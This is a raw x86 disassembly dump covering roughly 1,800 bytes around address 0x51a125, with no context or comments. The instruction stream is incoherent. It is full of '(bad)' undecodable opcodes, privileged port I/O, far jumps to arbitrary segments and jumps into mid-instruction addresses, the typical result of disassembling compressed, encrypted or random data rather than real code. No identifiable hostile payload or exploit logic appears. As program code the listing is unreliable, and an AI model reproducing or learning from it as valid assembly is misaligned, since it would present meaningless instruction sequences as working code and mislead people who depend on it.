  51a125:	dec    esi
  51a126:	xchg   ecx,eax
  51a127:	clc    
  51a128:	in     eax,dx
  51a129:	xor    al,0x11
  51a12b:	pop    ebp
  51a12c:	(bad)  
  51a12d:	pop    ss
  51a12e:	int    0x59
  51a130:	jge    0x51a11f
  51a132:	fnstenv [ecx-0x22]
  51a135:	ror    BYTE PTR ds:0x9d0c3d4d,cl
  51a13b:	or     BYTE PTR [ebp+0x4e],0x88
  51a13f:	jno    0x51a160
  51a141:	lds    edi,FWORD PTR [edx]
  51a143:	psllw  mm7,QWORD PTR [ebx-0x17]
  51a147:	add    DWORD PTR [edi],esi
  51a149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a14a:	shr    BYTE PTR [ecx+0x2796e30],1
  51a150:	retf   0x268a
  51a153:	(bad)  
  51a154:	ins    DWORD PTR es:[edi],dx
  51a155:	xchg   esi,eax
  51a156:	aaa    
  51a157:	jns    0x51a142
  51a159:	cs mov cl,0x32
  51a15c:	push   ebp
  51a15d:	mov    ebx,0x4f80e60d
  51a162:	pop    ebx
  51a163:	neg    DWORD PTR [esi+0x2c3a6dc6]
  51a169:	push   ds
  51a16a:	inc    edx
  51a16b:	mov    bh,0xe5
  51a16d:	test   al,0x12
  51a16f:	mov    WORD PTR [edx+0x14],ds
  51a172:	addr16 call 0x3bea:0xb39a98d0
  51a17a:	scas   al,BYTE PTR es:[edi]
  51a17b:	sub    ah,0x2c
  51a17e:	jae    0x51a1ba
  51a180:	sti    
  51a181:	push   cs
  51a182:	ja     0x51a14c
  51a184:	mov    bl,0xae
  51a186:	xor    BYTE PTR [edi],0x4b
  51a189:	adc    ah,0x56
  51a18c:	test   eax,0xdea791da
  51a191:	pop    esi
  51a192:	dec    esi
  51a193:	mov    ah,bl
  51a195:	cmc    
  51a196:	sahf   
  51a197:	xor    BYTE PTR [eax-0x6c],0xcf
  51a19b:	mov    edx,0x3ca78369
  51a1a0:	sub    al,0x2b
  51a1a2:	mov    DWORD PTR [ebx-0x3f],0xf759b928
  51a1a9:	jb     0x51a12c
  51a1ab:	mov    bh,0x3
  51a1ad:	clc    
  51a1ae:	mov    ds:0x1f081999,eax
  51a1b3:	or     al,0x1c
  51a1b5:	mov    ah,0xda
  51a1b7:	lods   al,BYTE PTR ds:[esi]
  51a1b8:	repnz add ecx,ebx
  51a1bb:	dec    esi
  51a1bc:	jl     0x51a1c2
  51a1be:	or     ecx,DWORD PTR [esi+ecx*2+0x6d2339d3]
  51a1c5:	paddusb mm7,mm1
  51a1c8:	outs   dx,BYTE PTR ds:[esi]
  51a1c9:	dec    esi
  51a1ca:	inc    eax
  51a1cb:	mov    WORD PTR [edi],?
  51a1cd:	in     eax,dx
  51a1ce:	(bad)  
  51a1cf:	out    dx,al
  51a1d0:	(bad)  
  51a1d2:	fild   QWORD PTR [ebp-0x5c525272]
  51a1d8:	(bad)  
  51a1d9:	cli    
  51a1da:	xchg   esi,eax
  51a1db:	retf   
  51a1dc:	xor    eax,0x905ab1c1
  51a1e1:	adc    ecx,esp
  51a1e3:	ins    BYTE PTR es:[edi],dx
  51a1e4:	cmp    al,BYTE PTR [ebp-0x31e8fa54]
  51a1ea:	adc    DWORD PTR [ebx],ebx
  51a1ec:	cmc    
  51a1ed:	mov    WORD PTR ds:0xdd9409b4,fs
  51a1f3:	push   ebp
  51a1f4:	dec    eax
  51a1f5:	jmp    FWORD PTR [ebx]
  51a1f7:	jecxz  0x51a182
  51a1f9:	popa   
  51a1fa:	xor    BYTE PTR [ebx+0x4c],0xce
  51a1fe:	nop
  51a1ff:	cwde   
  51a200:	imul   edx,DWORD PTR [eax],0xe45ee86d
  51a206:	adc    al,0xdf
  51a208:	mov    dh,bl
  51a20a:	popa   
  51a20b:	test   DWORD PTR [esi+0x31a017f4],ebp
  51a211:	mov    al,ds:0x3c629aa6
  51a216:	(bad)  
  51a217:	shr    DWORD PTR [ebx],0xc8
  51a21a:	xchg   DWORD PTR [edx+0xe],ebp
  51a21d:	sbb    al,0x56
  51a21f:	pop    ebx
  51a220:	pop    ebp
  51a221:	sbb    eax,0xd5d3aa64
  51a226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a227:	cmp    eax,0x2da5432
  51a22c:	iret   
  51a22d:	or     al,0xcc
  51a22f:	fwait
  51a230:	add    DWORD PTR [esi+ebx*8+0x1e],edx
  51a234:	cld    
  51a235:	push   cs
  51a236:	jns    0x51a231
  51a238:	rol    DWORD PTR [eax+edx*4-0x21],0x98
  51a23d:	push   0x6ed826e1
  51a242:	inc    edi
  51a243:	mov    ds:0x6b48c858,al
  51a248:	hlt    
  51a249:	sub    esp,esi
  51a24b:	push   0xf77b1c8a
  51a250:	xchg   edi,eax
  51a251:	and    eax,DWORD PTR [ebx]
  51a253:	push   cs
  51a254:	in     al,dx
  51a255:	leave  
  51a256:	cmp    ch,bh
  51a258:	jp     0x51a26e
  51a25a:	pop    esp
  51a25b:	std    
  51a25c:	sub    DWORD PTR [edi+0x35478774],esp
  51a262:	enter  0x4f93,0x30
  51a266:	xor    DWORD PTR [eax-0x5d4eaedb],ecx
  51a26c:	xlat   BYTE PTR ds:[ebx]
  51a26d:	push   es
  51a26e:	adc    DWORD PTR [ebx-0x76],esi
  51a271:	ror    BYTE PTR [ebp+0xdd5e77],0xaf
  51a278:	xchg   BYTE PTR [eax],ch
  51a27a:	sbb    ebx,DWORD PTR [esi-0x5a]
  51a27d:	das    
  51a27e:	cld    
  51a27f:	rcl    BYTE PTR [eax-0x7cf74144],0x46
  51a286:	les    edx,FWORD PTR [ecx-0x4b9f89f9]
  51a28c:	lods   eax,DWORD PTR ds:[esi]
  51a28d:	ret    
  51a28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51a28f:	in     al,0xbe
  51a291:	dec    edi
  51a292:	add    ebx,DWORD PTR [ebx+edx*4+0x72]
  51a296:	inc    esp
  51a297:	jns    0x51a2e4
  51a299:	retf   
  51a29a:	aad    0x91
  51a29c:	xchg   ebp,eax
  51a29d:	mov    bh,BYTE PTR [ebx+0x6f]
  51a2a0:	lods   al,BYTE PTR ds:[esi]
  51a2a1:	dec    eax
  51a2a2:	or     BYTE PTR [eax+0x45],0xfc
  51a2a6:	(bad)  
  51a2a7:	cmp    BYTE PTR [edi+eax*1+0x6a5ba512],dh
  51a2ae:	sub    edi,DWORD PTR [ebx-0x194ddd03]
  51a2b4:	in     eax,dx
  51a2b5:	jge    0x51a31a
  51a2b7:	out    dx,al
  51a2b8:	mov    bl,0x5b
  51a2ba:	jmp    0x43bd:0x144e35b5
  51a2c1:	out    0x58,al
  51a2c3:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  51a2c5:	dec    esi
  51a2c6:	pop    ss
  51a2c7:	add    al,0xfb
  51a2c9:	retf   0x945e
  51a2cc:	and    esp,ecx
  51a2ce:	fs dec eax
  51a2d0:	xchg   edi,eax
  51a2d1:	leave  
  51a2d2:	push   cs
  51a2d3:	mov    ebx,0x5adb399
  51a2d8:	adc    BYTE PTR [esi-0x39],bh
  51a2db:	xchg   edx,eax
  51a2dc:	repnz sti 
  51a2de:	jmp    0x51a2d6
  51a2e0:	cmc    
  51a2e1:	ss and al,0x91
  51a2e4:	call   0xb09a:0x33ff1616
  51a2eb:	scas   al,BYTE PTR es:[edi]
  51a2ec:	adc    DWORD PTR [edi-0x3f],eax
  51a2ef:	retf   0x1f73
  51a2f2:	sbb    al,0x9d
  51a2f4:	pop    ebx
  51a2f5:	mov    eax,ds:0x1fdaa365
  51a2fa:	dec    esp
  51a2fb:	je     0x51a2e3
  51a2fd:	and    DWORD PTR [ebp+0x40],eax
  51a300:	lea    ebx,[esi]
  51a302:	call   DWORD PTR [esi+0x39]
  51a305:	or     ebp,ecx
  51a307:	or     DWORD PTR [edx-0x21a77056],edx
  51a30d:	xor    eax,0xa14116df
  51a312:	cmp    edi,DWORD PTR [ebx+0x5b]
  51a315:	sub    bh,BYTE PTR [ecx-0x61]
  51a318:	scas   al,BYTE PTR es:[edi]
  51a319:	push   es
  51a31a:	in     al,dx
  51a31b:	mov    ds:0x2bfcde09,al
  51a320:	cmp    DWORD PTR [ecx-0x685b5e12],edx
  51a326:	mov    ecx,0xdd0df1f2
  51a32b:	jmp    0x51a34e
  51a32d:	sub    DWORD PTR [ebp-0x49a3c546],0x29
  51a334:	dec    ebp
  51a335:	jnp    0x51a2f1
  51a337:	push   esp
  51a338:	enter  0xf5db,0xa
  51a33c:	out    0x4,al
  51a33e:	push   esi
  51a33f:	fild   WORD PTR [edi-0x7cc4cf73]
  51a345:	jp     0x51a30b
  51a347:	jne    0x51a3c2
  51a349:	xchg   esp,eax
  51a34a:	dec    esp
  51a34b:	aaa    
  51a34c:	icebp  
  51a34d:	cld    
  51a34e:	not    DWORD PTR [edx+0x9f38eaa]
  51a354:	push   eax
  51a355:	inc    ebp
  51a357:	cmp    al,0xa1
  51a359:	and    al,BYTE PTR [edx+0x2a]
  51a35c:	pop    ecx
  51a35d:	nop
  51a35e:	out    0x60,al
  51a360:	(bad)  
  51a361:	push   edx
  51a362:	pop    ds
  51a363:	add    dx,WORD PTR [edx]
  51a366:	std    
  51a367:	ins    BYTE PTR es:[edi],dx
  51a368:	cmp    DWORD PTR [edi-0xa],edi
  51a36b:	out    0xda,al
  51a36d:	imul   esi,ebx,0xffffffb2
  51a370:	sar    BYTE PTR ds:0x79207959,0xa1
  51a377:	sbb    eax,0x16c4d12
  51a37c:	xchg   esi,eax
  51a37d:	je     0x51a35a
  51a37f:	mov    cl,BYTE PTR [edx]
  51a381:	ffreep st(7)
  51a383:	dec    ecx
  51a384:	repz in al,dx
  51a386:	leave  
  51a387:	call   0x712a:0x56b51e76
  51a38e:	addr16 or al,0x0
  51a391:	into   
  51a392:	dec    ecx
  51a393:	xchg   edi,eax
  51a394:	or     DWORD PTR [edx+ebp*8],eax
  51a397:	jns    0x51a38c
  51a399:	gs int 0x95
  51a39c:	and    eax,0x8545d80f
  51a3a1:	iret   
  51a3a2:	mov    al,0x2f
  51a3a4:	clc    
  51a3a5:	out    dx,al
  51a3a6:	xor    eax,0xa9e70e68
  51a3ab:	mov    bh,BYTE PTR [ecx-0x73]
  51a3ae:	test   BYTE PTR [eax+0x40d21e7b],0x3c
  51a3b5:	sub    al,0xac
  51a3b7:	pop    esp
  51a3b8:	cmp    bh,dl
  51a3ba:	out    dx,eax
  51a3bb:	fadd   DWORD PTR [eax]
  51a3bd:	jnp    0x51a369
  51a3bf:	jbe    0x51a356
  51a3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51a3c2:	push   edx
  51a3c3:	push   esp
  51a3c4:	fistp  QWORD PTR [ebx-0x37]
  51a3c7:	push   eax
  51a3c8:	or     al,0xa9
  51a3ca:	lods   eax,DWORD PTR ds:[esi]
  51a3cb:	mov    ds:0xb33c12dc,eax
  51a3d0:	das    
  51a3d1:	daa    
  51a3d2:	add    cl,BYTE PTR [esp-0xd50c1a7]
  51a3d9:	lahf   
  51a3da:	jl     0x51a428
  51a3dc:	shl    BYTE PTR [ebp+ebp*4+0x3f],cl
  51a3e0:	lods   al,BYTE PTR ds:[esi]
  51a3e1:	retf   
  51a3e2:	jecxz  0x51a440
  51a3e4:	or     DWORD PTR [edi+0x578d9485],ebp
  51a3ea:	rcr    ch,cl
  51a3ec:	sahf   
  51a3ed:	pop    esi
  51a3ee:	fistp  DWORD PTR [ebp-0x1180f5d3]
  51a3f4:	add    dl,BYTE PTR [edx+0x38]
  51a3f7:	push   edi
  51a3f8:	ds ins BYTE PTR es:[edi],dx
  51a3fa:	and    esi,edi
  51a3fc:	jbe    0x51a3f8
  51a3fe:	and    dl,BYTE PTR [esi-0x5ba81c43]
  51a404:	mov    edi,edi
  51a406:	into   
  51a407:	js     0x51a3bb
  51a409:	push   ds
  51a40a:	int    0x43
  51a40c:	add    DWORD PTR [ebx-0x1e],edi
  51a40f:	dec    esp
  51a410:	loop   0x51a3e4
  51a412:	cmp    BYTE PTR [ebp-0x77],al
  51a415:	lods   eax,DWORD PTR ds:[esi]
  51a416:	ret    0xe427
  51a419:	ins    DWORD PTR es:[edi],dx
  51a41a:	adc    cl,BYTE PTR [ebx-0x197d7fd0]
  51a420:	scas   eax,DWORD PTR es:[edi]
  51a421:	or     BYTE PTR [edx+0x27f9262f],cl
  51a427:	mov    ecx,0x7ff20fa8
  51a42c:	aas    
  51a42d:	mov    ch,0xcd
  51a42f:	fsubr  QWORD PTR [edi-0x8af7277]
  51a435:	xchg   edx,eax
  51a436:	sbb    eax,0x18e07dab
  51a43b:	out    dx,eax
  51a43c:	mov    edx,0x62bec6cc
  51a441:	dec    ebp
  51a442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a443:	psrld  mm2,QWORD PTR [ebp+0x20836cdb]
  51a44a:	aas    
  51a44b:	je     0x51a4c6
  51a44d:	jecxz  0x51a3f1
  51a44f:	lea    ecx,[edx+ebp*1+0x2c]
  51a453:	inc    ebx
  51a454:	gs xchg esi,eax
  51a456:	mov    dh,0x25
  51a458:	pop    edi
  51a459:	adc    eax,0xc328bb37
  51a45e:	push   ecx
  51a45f:	inc    edx
  51a460:	ror    edx,1
  51a462:	ss jb  0x51a402
  51a465:	mov    dh,0x2b
  51a467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a468:	sbb    eax,0x9b6ea557
  51a46d:	aad    0xc7
  51a46f:	ins    DWORD PTR es:[edi],dx
  51a470:	mov    DWORD PTR [ebx+0x1fe9233],ebp
  51a476:	call   0xf0b3c82c
  51a47b:	or     al,0xc1
  51a47d:	sub    dh,ch
  51a47f:	jne    0x51a477
  51a481:	add    BYTE PTR [eax+0x33],dh
  51a484:	jns    0x51a433
  51a486:	sbb    DWORD PTR [ebx+0x7d192062],eax
  51a48c:	ficomp WORD PTR [ecx-0x50]
  51a48f:	mov    edx,0xee003582
  51a494:	ins    BYTE PTR es:[edi],dx
  51a495:	dec    ecx
  51a496:	inc    esp
  51a497:	mov    esp,0x5abe6569
  51a49c:	cmp    al,0x88
  51a49e:	cmp    cl,al
  51a4a0:	sti    
  51a4a1:	xchg   esp,eax
  51a4a2:	fild   QWORD PTR [eax+ecx*4]
  51a4a5:	dec    ebp
  51a4a6:	pushf  
  51a4a7:	stc    
  51a4a8:	outs   dx,DWORD PTR ds:[esi]
  51a4a9:	mov    ss,WORD PTR [edi-0x14]
  51a4ac:	(bad)  
  51a4ad:	(bad)  
  51a4ae:	mov    ah,0xdc
  51a4b0:	lods   al,BYTE PTR ds:[esi]
  51a4b1:	mov    ebx,0x801628bd
  51a4b6:	adc    ebp,DWORD PTR [edx-0x408bfd40]
  51a4bc:	cmp    al,0xff
  51a4be:	loop   0x51a4db
  51a4c0:	pop    ebx
  51a4c1:	or     eax,0xa212d406
  51a4c6:	cmp    DWORD PTR ds:0xd10336ad,esp
  51a4cc:	jg     0x51a4bb
  51a4ce:	out    0x6a,al
  51a4d0:	add    BYTE PTR [edi-0x35],dl
  51a4d3:	aam    0x60
  51a4d5:	push   edx
  51a4d6:	jb     0x51a552
  51a4d8:	jecxz  0x51a464
  51a4da:	push   ebp
  51a4db:	add    bl,bh
  51a4dd:	pop    eax
  51a4de:	sbb    BYTE PTR [eax-0x5],dl
  51a4e1:	adc    al,0xcd
  51a4e3:	dec    ecx
  51a4e4:	ror    DWORD PTR [ecx+0x79],0x15
  51a4e8:	or     BYTE PTR [edi+0x63be8a75],bl
  51a4ee:	(bad)  
  51a4ef:	jle    0x51a512
  51a4f1:	sahf   
  51a4f2:	daa    
  51a4f3:	mov    dl,0x9d
  51a4f5:	sbb    al,0x4f
  51a4f7:	xchg   ebx,eax
  51a4f8:	dec    esp
  51a4f9:	(bad)  
  51a4fa:	test   al,0xae
  51a4fc:	retf   0x1a57
  51a4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a500:	dec    edi
  51a501:	aam    0x3e
  51a503:	iret   
  51a504:	and    eax,0x726d75b3
  51a509:	es popa 
  51a50b:	pop    ebx
  51a50c:	and    DWORD PTR [eax+0x1d],esp
  51a50f:	bound  esi,QWORD PTR [esi]
  51a511:	sbb    esi,DWORD PTR [edx-0x74d6ba38]
  51a517:	stc    
  51a518:	add    ecx,edi
  51a51a:	mov    ecx,edx
  51a51c:	js     0x51a598
  51a51e:	or     al,0x3b
  51a520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51a521:	sbb    al,0xd0
  51a523:	test   al,0x9e
  51a525:	sub    eax,0x87fb27c6
  51a52a:	sbb    BYTE PTR [edx],0x81
  51a52d:	lea    ebp,[edi]
  51a52f:	or     al,0x64
  51a531:	in     eax,dx
  51a532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51a533:	(bad)  
  51a534:	dec    eax
  51a535:	loopne 0x51a4f9
  51a537:	xlat   BYTE PTR ds:[ebx]
  51a538:	clc    
  51a539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a53a:	mov    DWORD PTR [ebx+0xd],esp
  51a53d:	nop
  51a53e:	push   ss
  51a53f:	gs pusha 
  51a541:	dec    ecx
  51a542:	and    BYTE PTR ss:[ebp-0x5af5ac17],al
  51a549:	dec    eax
  51a54a:	xchg   esi,eax
  51a54b:	out    dx,al
  51a54c:	mov    BYTE PTR [esp+ecx*4+0x1c],bh
  51a550:	add    cl,BYTE PTR [ebx+ebx*2]
  51a553:	push   edx
  51a554:	int    0x43
  51a556:	or     cl,BYTE PTR [ebp-0x5fcd8103]
  51a55c:	jno    0x51a50f
  51a55e:	xchg   ebx,eax
  51a55f:	leave  
  51a560:	jmp    0x4f8:0x39cdde0e
  51a567:	dec    esi
  51a568:	xchg   edx,eax
  51a569:	push   es
  51a56a:	pxor   mm1,QWORD PTR [ebp+0x9]
  51a56e:	inc    esi
  51a56f:	scas   eax,DWORD PTR es:[edi]
  51a570:	rcr    DWORD PTR [ecx-0x748c5ff],0x5b
  51a577:	adc    esi,DWORD PTR [esi]
  51a579:	push   ds
  51a57a:	mov    edi,0x3110bf79
  51a57f:	test   eax,0x9003b11
  51a584:	(bad)  
  51a585:	gs add dh,bh
  51a588:	mov    BYTE PTR [ecx+0x167cf331],dl
  51a58e:	cdq    
  51a58f:	jns    0x51a53f
  51a591:	inc    ecx
  51a592:	out    0x32,eax
  51a594:	scas   al,BYTE PTR es:[edi]
  51a595:	scas   eax,DWORD PTR es:[edi]
  51a596:	add    ebx,0xffffff8c
  51a599:	fiadd  DWORD PTR [ebp-0x41]
  51a59c:	and    dh,BYTE PTR [ebx]
  51a59e:	push   ecx
  51a59f:	mov    bh,bl
  51a5a1:	mov    ebp,0x6497e449
  51a5a6:	call   0x23f4a008
  51a5ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51a5ac:	imul   ebp,DWORD PTR [ebx+0x4b20eafa],0xffffff98
  51a5b3:	sbb    cl,bh
  51a5b5:	sbb    DWORD PTR [edi],0xffffffd0
  51a5b8:	bound  edx,QWORD PTR [edi+edx*2+0x61]
  51a5bc:	mov    al,0xab
  51a5be:	lea    ecx,[ebx-0x2b]
  51a5c1:	add    BYTE PTR [esi],bl
  51a5c3:	fwait
  51a5c4:	or     DWORD PTR [eax-0x5],ecx
  51a5c7:	ins    DWORD PTR es:[edi],dx
  51a5c8:	clc    
  51a5c9:	cmp    bl,BYTE PTR [ebx-0x5f]
  51a5cc:	mov    eax,0x4a8d9bc5
  51a5d1:	fcomi  st,st(6)
  51a5d3:	and    eax,0x1c642eb9
  51a5d8:	out    dx,al
  51a5d9:	add    BYTE PTR [esi+0x46],ch
  51a5dc:	aam    0xbc
  51a5de:	cmp    BYTE PTR gs:[ebx],0x70
  51a5e2:	mov    ds:0x8cffa64e,eax
  51a5e7:	arpl   WORD PTR [esi],dx
  51a5e9:	pop    ds
  51a5ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51a5eb:	mov    ecx,0x5a82c40
  51a5f0:	std    
  51a5f1:	mov    dh,0x6d
  51a5f3:	retf   
  51a5f4:	push   edi
  51a5f5:	lods   al,BYTE PTR ds:[esi]
  51a5f6:	adc    eax,DWORD PTR [edi+eiz*8-0x45]
  51a5fa:	stc    
  51a5fb:	jecxz  0x51a645
  51a5fd:	imul   ebx,DWORD PTR [esi-0x2bf14474],0xffffffb3
  51a604:	jge    0x51a5d1
  51a606:	or     BYTE PTR [edx],0x43
  51a609:	push   eax
  51a60a:	jae    0x51a622
  51a60c:	push   ds
  51a60d:	cdq    
  51a60e:	sbb    edx,DWORD PTR ds:0x58498cd4
  51a614:	mov    ebx,0xc970ce30
  51a619:	add    eax,DWORD PTR [edi-0x2037c886]
  51a61f:	xlat   BYTE PTR ds:[ebx]
  51a620:	xchg   edx,eax
  51a621:	sar    BYTE PTR [ecx-0x3daed51d],0xc6
  51a628:	or     ah,ah
  51a62a:	sub    ch,BYTE PTR [edi+0x5]
  51a62d:	or     esi,eax
  51a62f:	gs test eax,0x8f7acd60
  51a635:	lock test BYTE PTR [edx-0x5e],0xf
  51a63a:	cmp    BYTE PTR [esi-0x58],dl
  51a63d:	push   edx
  51a63e:	push   esi
  51a63f:	dec    edi
  51a640:	clc    
  51a641:	xchg   ecx,eax
  51a642:	inc    esi
  51a643:	pusha  
  51a644:	pop    edi
  51a645:	sub    DWORD PTR [edx-0x7f],esi
  51a648:	pop    ebx
  51a649:	jp     0x51a617
  51a64b:	dec    esi
  51a64c:	mov    ecx,0x179e52d0
  51a651:	aas    
  51a652:	mov    ds:0x79b2bc85,al
  51a657:	dec    edx
  51a658:	in     eax,0xf8
  51a65a:	mov    ebp,0xafc66c46
  51a65f:	inc    ecx
  51a660:	xor    cl,cl
  51a662:	inc    edx
  51a663:	push   ecx
  51a664:	sbb    bh,ah
  51a666:	out    dx,eax
  51a667:	cmp    eax,edi
  51a669:	adc    al,0x16
  51a66b:	jnp    0x51a6e8
  51a66d:	outs   dx,DWORD PTR ds:[esi]
  51a66e:	add    si,0xffcb
  51a672:	inc    ebp
  51a673:	popf   
  51a674:	loop   0x51a606
  51a676:	xor    al,0x89
  51a678:	std    
  51a679:	out    dx,eax
  51a67a:	xchg   DWORD PTR [esi-0x613c729d],eax
  51a680:	jmp    0x51a634
  51a682:	jmp    0x245f:0xb5372a32
  51a689:	xchg   edi,eax
  51a68a:	add    eax,0x1b316ce
  51a68f:	pop    es
  51a690:	ret    
  51a691:	mov    al,ds:0x3c4a375a
  51a696:	ret    0x9238
  51a699:	aas    
  51a69a:	ror    DWORD PTR [edi],1
  51a69c:	dec    edx
  51a69d:	pop    ebp
  51a69e:	fucom  st(0)
  51a6a0:	das    
  51a6a1:	rol    BYTE PTR [esi+edx*8-0x498eecb1],cl
  51a6a8:	jno    0x51a6a8
  51a6aa:	outs   dx,DWORD PTR ds:[esi]
  51a6ab:	inc    eax
  51a6ac:	add    BYTE PTR [eax-0x3faf7f53],dh
  51a6b2:	scas   eax,DWORD PTR es:[edi]
  51a6b3:	xchg   edi,eax
  51a6b4:	cmp    ch,BYTE PTR [ecx-0x556c25b6]
  51a6ba:	in     al,dx
  51a6bb:	mov    edx,0xa23fccb6
  51a6c0:	inc    eax
  51a6c1:	outs   dx,DWORD PTR ds:[esi]
  51a6c2:	xchg   edi,eax
  51a6c3:	clc    
  51a6c4:	inc    esi
  51a6c5:	lds    eax,FWORD PTR [esi+0x36]
  51a6c8:	pop    ds
  51a6c9:	jle    0x51a64e
  51a6cb:	sub    BYTE PTR [ebx],dl
  51a6cd:	xlat   BYTE PTR ds:[ebx]
  51a6ce:	sub    eax,0x1b45410
  51a6d3:	pop    ebx
  51a6d4:	sub    eax,0xf678f496
  51a6d9:	mov    ds:0x577a43a4,eax
  51a6de:	(bad)  
  51a6df:	xor    eax,0x66f0bfeb
  51a6e4:	out    dx,al
  51a6e5:	call   FWORD PTR [esp+eax*1-0x2858cc29]
  51a6ec:	mov    ch,0xa0
  51a6ee:	arpl   ax,bx
  51a6f0:	cld    
  51a6f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a6f2:	pop    ss
  51a6f3:	repz xchg edi,eax
  51a6f5:	add    eax,0xad070890
  51a6fa:	in     eax,0x4a
  51a6fc:	imul   ebp,edx,0xffffffeb
  51a6ff:	lahf   
  51a700:	clc    
  51a701:	repz mov dh,0x21
  51a704:	xor    edi,eax
  51a706:	jbe    0x51a694
  51a708:	scas   al,BYTE PTR es:[edi]
  51a709:	shl    DWORD PTR [edx],cl
  51a70b:	push   esp
  51a70c:	sbb    bh,bh
  51a70e:	clc    
  51a70f:	in     eax,0x7c
  51a711:	sbb    DWORD PTR [eax+0x2ce72136],eax
  51a717:	xchg   ebp,eax
  51a718:	mov    ch,0x8e
  51a71a:	popf   
  51a71b:	or     al,0xa8
  51a71d:	push   0x76a03277
  51a722:	les    ebx,FWORD PTR [esi+0x2]
  51a725:	mov    cs,WORD PTR [ebx-0x3b134556]
  51a72b:	add    DWORD PTR [ecx+0x1002f0df],edx
  51a731:	jg     0x51a723
  51a733:	popa   
  51a734:	aad    0x2
  51a736:	shr    BYTE PTR [edx+0x2ae3b260],1
  51a73c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a73d:	(bad)  
  51a73f:	pop    ds
  51a740:	push   0x2f
  51a742:	stos   DWORD PTR es:[edi],eax
  51a743:	int3   
  51a744:	mov    al,BYTE PTR [ebx-0x4a6ff1bb]
  51a74a:	jb     0x51a730
  51a74c:	cmp    DWORD PTR [ebx+esi*8],edx
  51a74f:	cdq    
  51a750:	dec    ecx
  51a751:	mov    esp,0xda8c7fc4
  51a756:	(bad)  
  51a757:	pop    ecx
  51a758:	repz jnp 0x51a79a
  51a75b:	push   eax
  51a75c:	mov    cl,0x4c
  51a75e:	in     al,dx
  51a75f:	push   ss
  51a760:	jb     0x51a7c5
  51a762:	aad    0x31
  51a764:	xchg   ebx,eax
  51a765:	push   ecx
  51a766:	mov    esi,0x415aae0f
  51a76b:	inc    ecx
  51a76c:	into   
  51a76d:	lods   eax,DWORD PTR ds:[esi]
  51a76e:	inc    esi
  51a76f:	sbb    cl,BYTE PTR [esi-0x75]
  51a772:	fstp   DWORD PTR [ecx]
  51a774:	push   esp
  51a775:	les    esi,FWORD PTR [ebx-0x8]
  51a778:	pop    ss
  51a779:	dec    eax
  51a77a:	mov    dl,0xc6
  51a77c:	push   ds
  51a77d:	(bad)  
  51a77e:	cmp    bl,bh
  51a780:	jmp    0x51a74a
  51a782:	jmp    0xf49e:0x597f8d6
  51a789:	mov    al,0x5d
  51a78b:	getsec 
  51a78d:	push   edi
  51a78e:	push   ebp
  51a78f:	test   eax,0x34a00f06
  51a794:	jecxz  0x51a7e6
  51a796:	or     DWORD PTR [esi],ebp
  51a798:	gs out dx,eax
  51a79a:	rol    DWORD PTR [esi+0x4db23640],1
  51a7a0:	mov    DWORD PTR [ecx+0x380ccd5d],edi
  51a7a6:	sbb    BYTE PTR [esi+eiz*2],cl
  51a7a9:	push   ss
  51a7aa:	xor    BYTE PTR [edi+0x15],0x9b
  51a7ae:	jae    0x51a82c
  51a7b0:	push   edx
  51a7b1:	fcomp  QWORD PTR [ebx+0x1a6a5f8b]
  51a7b7:	push   0x9ff20582
  51a7bc:	scas   al,BYTE PTR es:[edi]
  51a7bd:	cmp    ch,bl
  51a7bf:	mov    bh,0x77
  51a7c1:	cmp    eax,0x349a21c2
  51a7c6:	add    BYTE PTR [ebp+0x29398146],bl
  51a7cc:	or     eax,0x42c30629
  51a7d1:	(bad)  
  51a7d2:	aaa    
  51a7d3:	adc    BYTE PTR [ebx+0x38b7a176],0xf
  51a7da:	clc    
  51a7db:	sbb    DWORD PTR [ebx],esp
  51a7dd:	fiadd  DWORD PTR [esi+0x7f]
  51a7e0:	xchg   ebx,eax
  51a7e1:	out    0x3d,al
  51a7e3:	xchg   edi,eax
  51a7e4:	dec    esi
  51a7e5:	fsub   DWORD PTR [eax-0x3e885b86]
  51a7eb:	and    eax,0xa2e90b8
  51a7f0:	mov    dl,0x74
  51a7f2:	fistp  QWORD PTR [esi+0xe210c9c]
  51a7f8:	aaa    
  51a7f9:	xlat   BYTE PTR ds:[ebx]
  51a7fa:	ret    
  51a7fb:	(bad)  
  51a7fc:	adc    dl,dl
  51a7fe:	js     0x51a85b
  51a800:	mov    al,0xf1
  51a802:	ret    0x8612
  51a805:	and    al,0x6b
  51a807:	adc    al,0x35
  51a809:	or     DWORD PTR [edi],esp
  51a80b:	add    al,0xe3
  51a80d:	or     dh,cl
  51a80f:	lock mov ebp,0x3c27cb3d
  51a815:	sbb    ebx,DWORD PTR [edx+edi*4-0x1da59e29]
  51a81c:	jno    0x51a7b7
  51a81e:	add    edx,DWORD PTR [edx]
  51a820:	jmp    0x51a848
  51a822:	xchg   esp,eax
  51a823:	das    
  51a824:	cwde   
  51a825:	jb     0x51a810
  51a827:	ret    0x5275
  51a82a:	mov    ds:0xfdb56381,al
  51a82f:	and    edx,DWORD PTR [ebp-0x390d1909]
  51a835:	mov    ch,0x2d
  51a837:	cmp    dl,bl
  51a839:	lahf   
  51a83a:	pop    eax
  51a83b:	push   es
  51a83c:	mov    ebx,0x5f3d1960
  51a841:	int    0x9a
  51a843:	jmp    0x318632c7
  51a848:	push   ss
  51a849:	push   esp
  51a84a:	push   edi
  51a84b:	pop    ds
  51a84c:	adc    eax,0x3206b12a
  51a851:	xor    dh,BYTE PTR [ebx-0x4e30c741]
  51a857:	push   es
  51a858:	test   DWORD PTR [eax],ebx
  51a85a:	jecxz  0x51a84f
  51a85c:	adc    al,BYTE PTR [eax]
  51a85e:	and    DWORD PTR [edx],esi
